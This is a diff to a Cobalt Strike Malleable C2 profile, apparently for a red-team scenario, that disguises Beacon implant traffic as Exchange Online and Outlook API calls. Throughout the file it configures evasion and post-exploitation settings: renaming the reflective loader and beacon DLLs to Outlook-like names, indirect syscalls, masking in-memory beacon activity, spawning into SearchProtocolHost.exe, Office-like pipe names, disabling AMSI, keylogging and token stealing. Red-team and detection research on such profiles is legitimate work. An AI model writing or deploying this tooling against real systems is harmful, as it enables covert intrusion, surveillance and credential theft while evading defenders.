@@ -1,7 +1,10 @@
 # Malleable C2 Profile - Microsoft 365 Exchange / Outlook theme
 # CS 4.13 / Beacon Booster compatible
+# Sub-profile of reference_mod_413.profile (Azure Function redirector baseline)
 # Simulates Exchange Online / Outlook REST API traffic
 # Target scenario: fenix-a
+
+# Various options
 
 set sample_name "Microsoft Exchange Online";
 set data_jitter "72";
@@ -15,13 +18,18 @@ set ssh_banner "OpenSSH_8.7p1 RHEL-3";
 set sleeptime "45000";
 set jitter "40";
 
+set killdate "20260916";
+
 set ssh_pipename "outlook_sync_####";
 set tcp_frame_header "";
 set tcp_port "9443";
 
 set headers_remove "";
+
 set steal_token_access_mask "11";
+
 set tasks_proxy_max_size "94371840";
+
 set tasks_dns_proxy_max_size "71680";
 
 dns-beacon {
@@ -187,6 +195,11 @@ http-beacon {
     set data_required_length "128-384";
 }
 
+# ------------------------------------------------------------
+# BASELINE HARDENING - matches reference_mod_413.profile
+# See references/profile-baseline.md before editing.
+# ------------------------------------------------------------
+
 stage {
 
     set checksum "0";
@@ -200,6 +213,7 @@ stage {
 
     # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms
 
+    # Separation knob: theme-matching strrep replacements
     transform-x86 {
         strrep "ReflectiveLoader" "ExchangeSync";
         strrep "beacon.x64.dll" "outlk64.dll";
@@ -212,6 +226,7 @@ stage {
         strrep "beacon.dll" "outlk.dll";
     }
 
+    # Separation knob: theme-matching decoy string
     stringw "Exchange Online Module";
 
     set allocator "VirtualAlloc";
@@ -222,12 +237,13 @@ stage {
     set syscall_method "Indirect";
 
     beacon_gate {
-      Comms;
+      All;
     }
 
     set stomppe "true";
     set userwx "false";
 
+    # Separation knobs: varied per profile
     set compile_time "18 Jan 2024 11:07:00";
     set entry_point "86512";
 
@@ -246,6 +262,7 @@ process-inject {
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
 
+    # Separation knob: 2 NOPs (baseline)
     transform-x86 {
         prepend "\x90\x90";
     }
@@ -265,11 +282,15 @@ process-inject {
 }
 
 post-ex {
+    # Separation knob: unique spawnto per profile
     set spawnto_x86 "%windir%\\syswow64\\SearchProtocolHost.exe";
     set spawnto_x64 "%windir%\\sysnative\\SearchProtocolHost.exe";
 
     set obfuscate "true";
+
+    # Separation knob: unique post-ex pipe per profile
     set pipename "OfficeHubHL_####, OfficeC2RClient_###";
+
     set smartinject "true";
     set amsi_disable "true";
     set keylogger "GetAsyncKeyState";
